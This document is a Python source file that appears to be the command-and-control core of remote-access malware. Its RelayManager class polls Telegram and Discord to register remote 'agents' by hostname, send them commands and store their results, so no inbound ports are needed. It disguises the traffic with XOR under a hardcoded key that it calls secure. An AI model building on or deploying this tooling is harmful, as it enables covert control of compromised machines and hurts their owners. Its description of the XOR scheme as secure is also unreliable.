import threading
import time
import json
import base64
from pathlib import Path
from typing import Optional, List
from core.logger import setup_logger

log = setup_logger("console")

class RelayManager:
    """Manages multiple message relays (Telegram, Discord, GitHub) for agent communication."""
    def __init__(self):
        self.telegram = None
        self.discord = None
        self.github = None
        self.agents = {}
        self.running = True
        self.encryption_key = b"kaal_secure_relay_2025"

    def init_telegram(self, token: str, chat_id: str):
        from .telegram_relay import TelegramRelay
        self.telegram = TelegramRelay(token, chat_id, self.encryption_key)

    def init_discord(self, token: str, channel_id: int):
        from .discord_relay import DiscordRelay
        self.discord = DiscordRelay(token, channel_id, self.encryption_key)

    def init_github(self, token: str, gist_id: str):
        from .github_relay import GitHubRelay
        self.github = GitHubRelay(token, gist_id, self.encryption_key)

    def start_pollers(self):
        """Start background threads to poll each relay service."""
        def poll_telegram():
            while self.running and self.telegram:
                try:
                    for msg in self.telegram.get_updates():
                        self._process_message("telegram", msg)
                except Exception as e:
                    log.error(f"Telegram poll error: {e}")
                time.sleep(2)

        def poll_discord():
            while self.running and self.discord:
                try:
                    for msg in self.discord.get_messages():
                        self._process_message("discord", msg)
                except Exception as e:
                    log.error(f"Discord poll error: {e}")
                time.sleep(3)

        threading.Thread(target=poll_telegram, daemon=True).start()
        threading.Thread(target=poll_discord, daemon=True).start()
        log.info("Relay pollers started – no inbound ports required")

    def _process_message(self, source: str, raw: str):
        """Decrypt and process an incoming message from an agent."""
        try:
            dec = self._decrypt(raw)
            data = json.loads(dec)
            agent_id = data.get("agent_id")
            if not agent_id:
                return

            if data.get("type") == "register":
                self.agents[agent_id] = {
                    "first_seen": time.time(),
                    "last_seen": time.time(),
                    "via": source,
                    "platform": data.get("platform"),
                    "hostname": data.get("hostname")
                }
                log.info(f"New agent registered: {agent_id} via {source}")

            elif data.get("type") == "result":
                task_id = data.get("task_id")
                result = data.get("result")
                result_dir = Path("data/results")
                result_dir.mkdir(parents=True, exist_ok=True)
                with open(result_dir / f"{agent_id}.log", "a") as f:
                    f.write(f"{time.time()}|{task_id}|{result}\n")
        except Exception as e:
            log.debug(f"Message processing failed: {e}")

    def send_command(self, agent_id: str, command: str, channels: List[str] = None):
        """Send an administrative command to a specific agent."""
        if channels is None:
            channels = ["telegram", "discord"]
        payload = {
            "agent_id": agent_id,
            "command": command,
            "type": "cmd",
            "timestamp": time.time()
        }
        enc = self._encrypt(json.dumps(payload))
        if "telegram" in channels and self.telegram:
            self.telegram.send_message(enc)
        if "discord" in channels and self.discord:
            self.discord.send_message(enc)
        log.info(f"Command sent to {agent_id}: {command[:50]}...")

    def _encrypt(self, s: str) -> str:
        """Simple XOR obfuscation – for lightweight confidentiality."""
        data = s.encode()
        enc = bytearray()
        key_len = len(self.encryption_key)
        for i, b in enumerate(data):
            enc.append(b ^ self.encryption_key[i % key_len])
        return base64.b64encode(enc).decode()

    def _decrypt(self, s: str) -> str:
        data = base64.b64decode(s)
        dec = bytearray()
        key_len = len(self.encryption_key)
        for i, b in enumerate(data):
            dec.append(b ^ self.encryption_key[i % key_len])
        return dec.decode()
